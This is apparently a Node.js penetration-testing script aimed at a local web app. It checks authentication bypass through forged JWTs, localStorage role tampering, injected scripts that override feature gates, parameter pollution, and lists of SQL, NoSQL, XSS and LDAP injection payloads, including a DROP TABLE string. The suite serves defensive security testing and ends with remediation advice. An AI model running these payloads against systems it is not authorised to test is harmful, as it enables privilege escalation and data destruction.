/**
 * Penetration Testing Suite: Authentication & Authorization Bypass
 * Tests for bypassing authentication and authorization controls
 */

const puppeteer = require('puppeteer');
const crypto = require('crypto');

class AuthBypassTests {
  constructor(baseUrl = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.findings = [];
  }

  /**
   * Log security findings
   */
  logFinding(severity, type, description, evidence = {}) {
    this.findings.push({
      timestamp: new Date().toISOString(),
      severity, // CRITICAL, HIGH, MEDIUM, LOW
      type,
      description,
      evidence
    });
    console.log(`[${severity}] ${type}: ${description}`);
  }

  /**
   * Test 1: Client-Side Token Manipulation
   * Attempt to forge JWT tokens and modify user roles
   */
  async testTokenManipulation() {
    console.log('\n🔍 Testing Token Manipulation Vulnerabilities...');
    
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    
    try {
      await page.goto(this.baseUrl);
      
      // Test 1a: Direct localStorage manipulation
      await page.evaluate(() => {
        // Simulate a fake admin token
        const fakeToken = btoa(JSON.stringify({
          sub: 'fake-admin-id',
          roles: ['SUPER_ADMIN'],
          exp: Math.floor(Date.now() / 1000) + 3600,
          iat: Math.floor(Date.now() / 1000)
        }));
        
        const fakeUserData = {
          id: 'fake-admin-id',
          email: 'hacker@evil.com',
          firstName: 'Evil',
          lastName: 'Hacker',
          roles: ['SUPER_ADMIN'],
          subscription: { plan: 'PRO', status: 'active' },
          emailVerified: true,
          businessVerified: true
        };
        
        localStorage.setItem('auth_token', `header.${fakeToken}.signature`);
        localStorage.setItem('user_data', JSON.stringify(fakeUserData));
        localStorage.setItem('refresh_token', 'fake-refresh-token');
        
        // Reload to apply changes
        window.location.reload();
      });
      
      await page.waitForTimeout(2000);
      
      // Check if we gained unauthorized access
      const hasAdminAccess = await page.evaluate(() => {
        return document.body.innerText.includes('Admin') || 
               document.body.innerText.includes('Super Admin') ||
               document.querySelector('[data-testid="admin-panel"]') !== null;
      });
      
      if (hasAdminAccess) {
        this.logFinding('CRITICAL', 'Token Manipulation', 
          'Client-side token validation allows role escalation through localStorage manipulation',
          { url: this.baseUrl, method: 'localStorage manipulation' });
      }
      
      // Test 1b: JWT payload modification
      await page.evaluate(() => {
        const existingToken = localStorage.getItem('auth_token');
        if (existingToken) {
          try {
            const parts = existingToken.split('.');
            if (parts.length === 3) {
              const payload = JSON.parse(atob(parts[1]));
              
              // Escalate privileges
              payload.roles = ['SUPER_ADMIN', 'ADMIN'];
              payload.exp = Math.floor(Date.now() / 1000) + 86400; // 24 hours
              
              const modifiedToken = parts[0] + '.' + btoa(JSON.stringify(payload)) + '.' + parts[2];
              localStorage.setItem('auth_token', modifiedToken);
              
              // Update user data to match
              const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
              userData.roles = ['SUPER_ADMIN', 'ADMIN'];
              userData.subscription = { plan: 'PRO', status: 'active' };
              localStorage.setItem('user_data', JSON.stringify(userData));
            }
          } catch (e) {
            console.log('Token modification failed:', e);
          }
        }
      });
      
    } catch (error) {
      console.error('Token manipulation test error:', error);
    } finally {
      await browser.close();
    }
  }

  /**
   * Test 2: Feature Gating Bypass
   * Attempt to bypass client-side feature restrictions
   */
  async testFeatureGatingBypass() {
    console.log('\n🔍 Testing Feature Gating Bypass...');
    
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    
    try {
      await page.goto(this.baseUrl);
      
      // Inject malicious script to bypass feature gates
      await page.addScriptTag({
        content: `
          // Override feature gating functions
          window.originalHasFeatureAccess = window.hasFeatureAccess;
          window.hasFeatureAccess = function() { return true; };
          
          // Override React components that might use feature gating
          if (window.React) {
            const originalCreateElement = window.React.createElement;
            window.React.createElement = function(type, props, ...children) {
              // Bypass FeatureGate components
              if (type && type.name === 'FeatureGate') {
                return originalCreateElement('div', {}, ...children);
              }
              return originalCreateElement(type, props, ...children);
            };
          }
          
          // Manipulate user state in local storage
          const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
          userData.roles = ['SUPER_ADMIN'];
          userData.subscription = { plan: 'PRO', status: 'active' };
          userData.isPro = true;
          localStorage.setItem('user_data', JSON.stringify(userData));
          
          console.log('Feature bypass injection complete');
        `
      });
      
      // Test accessing protected features
      const protectedFeatures = [
        '/admin',
        '/analytics',
        '/advanced-features',
        '/pro-dashboard',
        '/super-admin'
      ];
      
      for (const feature of protectedFeatures) {
        try {
          await page.goto(this.baseUrl + feature);
          await page.waitForTimeout(1000);
          
          const isAccessible = await page.evaluate(() => {
            return !document.body.innerText.includes('Access Denied') &&
                   !document.body.innerText.includes('Upgrade to Pro') &&
                   !document.body.innerText.includes('Insufficient permissions');
          });
          
          if (isAccessible) {
            this.logFinding('HIGH', 'Feature Bypass', 
              `Unauthorized access to protected feature: ${feature}`,
              { url: this.baseUrl + feature, method: 'Client-side bypass' });
          }
        } catch (error) {
          // Feature might not exist, which is fine
        }
      }
      
    } catch (error) {
      console.error('Feature gating bypass test error:', error);
    } finally {
      await browser.close();
    }
  }

  /**
   * Test 3: Session Management Vulnerabilities
   * Test for session fixation, hijacking, and management issues
   */
  async testSessionManagement() {
    console.log('\n🔍 Testing Session Management Vulnerabilities...');
    
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    
    try {
      await page.goto(this.baseUrl);
      
      // Test 3a: Session token exposure in JavaScript
      const tokenExposed = await page.evaluate(() => {
        return localStorage.getItem('auth_token') !== null ||
               sessionStorage.getItem('auth_token') !== null;
      });
      
      if (tokenExposed) {
        this.logFinding('HIGH', 'Token Exposure', 
          'Authentication tokens stored in accessible client storage',
          { storage: 'localStorage/sessionStorage', risk: 'XSS exploitation' });
      }
      
      // Test 3b: Token expiration bypass
      await page.evaluate(() => {
        const token = localStorage.getItem('auth_token');
        if (token) {
          try {
            const parts = token.split('.');
            const payload = JSON.parse(atob(parts[1]));
            
            // Set expiration to far future
            payload.exp = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year
            
            const modifiedToken = parts[0] + '.' + btoa(JSON.stringify(payload)) + '.' + parts[2];
            localStorage.setItem('auth_token', modifiedToken);
          } catch (e) {
            console.log('Token expiration manipulation failed:', e);
          }
        }
      });
      
      // Test 3c: Multiple session simulation
      const context2 = await browser.createIncognitoBrowserContext();
      const page2 = await context2.newPage();
      
      // Copy session data to new context
      const sessionData = await page.evaluate(() => ({
        token: localStorage.getItem('auth_token'),
        userData: localStorage.getItem('user_data'),
        refreshToken: localStorage.getItem('refresh_token')
      }));
      
      if (sessionData.token) {
        await page2.goto(this.baseUrl);
        await page2.evaluate((data) => {
          localStorage.setItem('auth_token', data.token);
          localStorage.setItem('user_data', data.userData);
          localStorage.setItem('refresh_token', data.refreshToken);
        }, sessionData);
        
        await page2.reload();
        
        const simultaneousLogin = await page2.evaluate(() => {
          return localStorage.getItem('auth_token') !== null;
        });
        
        if (simultaneousLogin) {
          this.logFinding('MEDIUM', 'Session Sharing', 
            'Session tokens can be reused across multiple browser contexts',
            { risk: 'Session hijacking', mitigation: 'Implement proper session management' });
        }
      }
      
      await context2.close();
      
    } catch (error) {
      console.error('Session management test error:', error);
    } finally {
      await browser.close();
    }
  }

  /**
   * Test 4: API Endpoint Authorization Bypass
   * Test server-side API endpoints for authorization issues
   */
  async testAPIAuthorizationBypass() {
    console.log('\n🔍 Testing API Authorization Bypass...');
    
    const apiEndpoints = [
      '/api/auth/me',
      '/api/users',
      '/api/admin/users',
      '/api/admin/analytics',
      '/api/superadmin/system',
      '/api/features/advanced-analytics',
      '/api/payments/history',
      '/api/business/valuation'
    ];
    
    // Test without authentication
    for (const endpoint of apiEndpoints) {
      try {
        const response = await fetch(this.baseUrl + endpoint);
        
        if (response.status !== 401 && response.status !== 403) {
          this.logFinding('CRITICAL', 'API Authorization Bypass', 
            `Unprotected API endpoint: ${endpoint}`,
            { 
              endpoint,
              status: response.status,
              headers: Object.fromEntries(response.headers.entries())
            });
        }
      } catch (error) {
        // Endpoint might not exist or be properly protected
      }
    }
    
    // Test with manipulated tokens
    const fakeToken = this.generateFakeJWT({
      sub: 'fake-user',
      roles: ['SUPER_ADMIN'],
      exp: Math.floor(Date.now() / 1000) + 3600
    });
    
    for (const endpoint of apiEndpoints) {
      try {
        const response = await fetch(this.baseUrl + endpoint, {
          headers: {
            'Authorization': `Bearer ${fakeToken}`,
            'Content-Type': 'application/json'
          }
        });
        
        if (response.status === 200) {
          this.logFinding('CRITICAL', 'Token Validation Bypass', 
            `API accepts forged tokens: ${endpoint}`,
            { 
              endpoint,
              fakeToken: fakeToken.substring(0, 50) + '...',
              status: response.status
            });
        }
      } catch (error) {
        // Expected for most cases
      }
    }
  }

  /**
   * Test 5: Role Escalation Attacks
   * Test various role escalation techniques
   */
  async testRoleEscalation() {
    console.log('\n🔍 Testing Role Escalation Attacks...');
    
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    
    try {
      await page.goto(this.baseUrl);
      
      // Test role escalation through profile update
      await page.evaluate(() => {
        // Attempt to modify profile with elevated roles
        if (window.fetch) {
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (url.includes('/profile') || url.includes('/user')) {
              // Inject elevated roles into requests
              if (options.body) {
                try {
                  const body = JSON.parse(options.body);
                  body.roles = ['SUPER_ADMIN', 'ADMIN'];
                  body.subscription = { plan: 'PRO', status: 'active' };
                  options.body = JSON.stringify(body);
                } catch (e) {
                  // Not JSON, try form data
                }
              }
            }
            return originalFetch(url, options);
          };
        }
      });
      
      // Test parameter pollution
      const testData = {
        'roles': ['BUYER'],
        'roles[]': ['SUPER_ADMIN'],
        'user[roles]': ['ADMIN'],
        'user.roles': ['SUPER_ADMIN'],
        'roles[0]': 'BUYER',
        'roles[1]': 'SUPER_ADMIN'
      };
      
      for (const [param, value] of Object.entries(testData)) {
        try {
          const formData = new URLSearchParams();
          formData.append(param, Array.isArray(value) ? value.join(',') : value);
          
          const response = await fetch(this.baseUrl + '/api/user/profile', {
            method: 'POST',
            body: formData,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
          });
          
          if (response.status === 200) {
            this.logFinding('HIGH', 'Parameter Pollution', 
              `Potential role escalation via parameter: ${param}`,
              { parameter: param, value, endpoint: '/api/user/profile' });
          }
        } catch (error) {
          // Expected for most cases
        }
      }
      
    } catch (error) {
      console.error('Role escalation test error:', error);
    } finally {
      await browser.close();
    }
  }

  /**
   * Test 6: Input Validation and Injection
   * Test for SQL injection, NoSQL injection, and other injection vulnerabilities
   */
  async testInjectionVulnerabilities() {
    console.log('\n🔍 Testing Injection Vulnerabilities...');
    
    const payloads = {
      sql: [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1' OR '1'='1' #"
      ],
      nosql: [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$gt": ""}'
      ],
      xss: [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>'
      ],
      ldap: [
        '*)(uid=*',
        '*)(|(objectClass=*))',
        '*)(&(password=*))',
        '*))%00'
      ]
    };
    
    const testEndpoints = [
      '/api/auth/login',
      '/api/users/search',
      '/api/business/search',
      '/api/analytics/filter'
    ];
    
    for (const endpoint of testEndpoints) {
      for (const [type, injections] of Object.entries(payloads)) {
        for (const payload of injections) {
          try {
            const testData = {
              email: payload,
              password: payload,
              search: payload,
              filter: payload,
              query: payload
            };
            
            const response = await fetch(this.baseUrl + endpoint, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(testData)
            });
            
            const responseText = await response.text();
            
            // Check for error patterns that might indicate injection
            const errorPatterns = [
              /sql.*error/i,
              /mysql.*error/i,
              /postgresql.*error/i,
              /mongodb.*error/i,
              /syntax.*error/i,
              /invalid.*query/i,
              /database.*error/i
            ];
            
            const hasError = errorPatterns.some(pattern => pattern.test(responseText));
            
            if (hasError || response.status === 500) {
              this.logFinding('HIGH', `${type.toUpperCase()} Injection`, 
                `Potential ${type} injection vulnerability`,
                { 
                  endpoint,
                  payload: payload.substring(0, 100),
                  response: responseText.substring(0, 200)
                });
            }
          } catch (error) {
            // Network errors are expected for most injection attempts
          }
        }
      }
    }
  }

  /**
   * Generate a fake JWT token for testing
   */
  generateFakeJWT(payload) {
    const header = { typ: 'JWT', alg: 'HS256' };
    const headerEncoded = Buffer.from(JSON.stringify(header)).toString('base64url');
    const payloadEncoded = Buffer.from(JSON.stringify(payload)).toString('base64url');
    const signature = crypto.randomBytes(32).toString('base64url');
    
    return `${headerEncoded}.${payloadEncoded}.${signature}`;
  }

  /**
   * Run all penetration tests
   */
  async runAllTests() {
    console.log('🚀 Starting Comprehensive Penetration Testing Suite');
    console.log('=' * 60);
    
    await this.testTokenManipulation();
    await this.testFeatureGatingBypass();
    await this.testSessionManagement();
    await this.testAPIAuthorizationBypass();
    await this.testRoleEscalation();
    await this.testInjectionVulnerabilities();
    
    this.generateReport();
  }

  /**
   * Generate penetration testing report
   */
  generateReport() {
    console.log('\n📊 PENETRATION TESTING REPORT');
    console.log('=' * 60);
    
    const severityCounts = this.findings.reduce((acc, finding) => {
      acc[finding.severity] = (acc[finding.severity] || 0) + 1;
      return acc;
    }, {});
    
    console.log(`Total Findings: ${this.findings.length}`);
    console.log(`Critical: ${severityCounts.CRITICAL || 0}`);
    console.log(`High: ${severityCounts.HIGH || 0}`);
    console.log(`Medium: ${severityCounts.MEDIUM || 0}`);
    console.log(`Low: ${severityCounts.LOW || 0}`);
    
    console.log('\n🔍 Detailed Findings:');
    this.findings.forEach((finding, index) => {
      console.log(`\n${index + 1}. [${finding.severity}] ${finding.type}`);
      console.log(`   Description: ${finding.description}`);
      console.log(`   Timestamp: ${finding.timestamp}`);
      if (Object.keys(finding.evidence).length > 0) {
        console.log(`   Evidence: ${JSON.stringify(finding.evidence, null, 2)}`);
      }
    });
    
    console.log('\n🛡️ Security Recommendations:');
    this.generateRecommendations();
  }

  /**
   * Generate security recommendations based on findings
   */
  generateRecommendations() {
    const recommendations = [
      '1. Implement server-side token validation and authorization',
      '2. Move feature gating logic to server-side API endpoints',
      '3. Use secure HTTP-only cookies for token storage',
      '4. Implement proper session management with server-side validation',
      '5. Add input validation and sanitization on all endpoints',
      '6. Implement rate limiting and request throttling',
      '7. Use parameterized queries to prevent injection attacks',
      '8. Add comprehensive logging and monitoring',
      '9. Implement Content Security Policy (CSP) headers',
      '10. Regular security audits and penetration testing'
    ];
    
    recommendations.forEach(rec => console.log(rec));
  }
}

module.exports = AuthBypassTests;

// Usage example
if (require.main === module) {
  const testSuite = new AuthBypassTests('http://localhost:3000');
  testSuite.runAllTests().catch(console.error);
}